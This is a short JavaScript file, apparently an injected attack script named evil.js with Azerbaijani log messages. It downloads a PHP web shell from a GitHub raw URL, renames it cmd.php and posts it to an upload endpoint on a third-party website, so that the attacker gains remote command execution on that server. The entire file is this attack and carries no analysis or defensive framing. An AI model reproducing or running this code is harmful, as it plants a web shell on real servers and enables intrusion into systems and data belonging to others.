console.log("evil.js faylı yükləndi!");
fetch("https://raw.githubusercontent.com/studentgupgup/testingg/refs/heads/main/shell.php")
  .then(r => r.blob())
  .then(blob => {
    const form = new FormData();
    form.append("file", new File([blob], "cmd.php", { type: "application/x-php" }));

    fetch("https://arminfo.info/search.php", {
      method: "POST",
      body: form
    }).then(res => res.text())
      .then(response => {
        console.log("Upload cavabı: ", response);
      }).catch(err => console.error("Upload xətası:", err));
  }).catch(err => console.error("Fayl çəkilmədi:", err));
